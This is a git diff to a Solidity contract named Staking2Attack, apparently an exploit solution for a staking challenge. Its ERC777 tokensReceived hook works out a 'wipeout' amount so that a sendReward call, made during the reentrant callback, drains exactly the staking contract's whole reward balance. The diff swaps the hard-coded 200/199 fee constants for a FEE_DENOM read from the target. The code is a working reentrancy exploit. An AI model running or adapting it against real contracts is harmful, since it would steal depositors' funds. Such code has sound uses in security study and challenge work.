@@ -12,10 +12,12 @@ contract Staking2Attack is IERC777Recipient, Context {
     bytes32 public constant RECIPIENT_INTERFACE = keccak256("ERC777TokensRecipient");
     Staking2 public immutable STAKING;
     IERC20 public immutable REWARDS;
+    uint256 public immutable FEE_DENOM;
 
     constructor(Staking2 staking) {
         STAKING = staking;
         REWARDS = staking.REWARDS();
+        FEE_DENOM = staking.FEE_DENOM();
     }
 
     function setUpOne(IERC20 token) external {
@@ -44,21 +46,20 @@ contract Staking2Attack is IERC777Recipient, Context {
         bytes calldata operatorData
     ) external override {
         require(to == address(this) && userData.length == 0 && operatorData.length == 0);
-        IERC20 token = IERC20(_msgSender());
         if (operator == address(STAKING) && from == address(STAKING)) {
             uint256 beforeBalance = REWARDS.balanceOf(address(this));
+            IERC20 token = IERC20(_msgSender());
 
             uint248 wipeout;
             {
                 (, uint248 lastReward, ) = STAKING.stakerInfo(token, address(this));
                 uint256 tokenBalance = token.balanceOf(address(STAKING));
                 uint256 rewardBalance = REWARDS.balanceOf(address(STAKING));
-                // This is the amount to be added to the reward so that when we
-                // call `sendReward` we claim exactly all of the balance of
-                // `STAKING`
+                // This is the amount to be added such that when we call
+                // `sendReward`, we get *exactly* all of `STAKING`'s balance
                 wipeout = uint248(
-                    (200 * tokenBalance * rewardBalance + 199 * lastReward * amount) /
-                        (199 * amount - 200 * tokenBalance)
+                    (FEE_DENOM * tokenBalance * rewardBalance + (FEE_DENOM - 1) * lastReward * amount) /
+                        ((FEE_DENOM - 1) * amount - FEE_DENOM * tokenBalance)
                 );
             }
             REWARDS.approve(address(STAKING), uint256(wipeout));
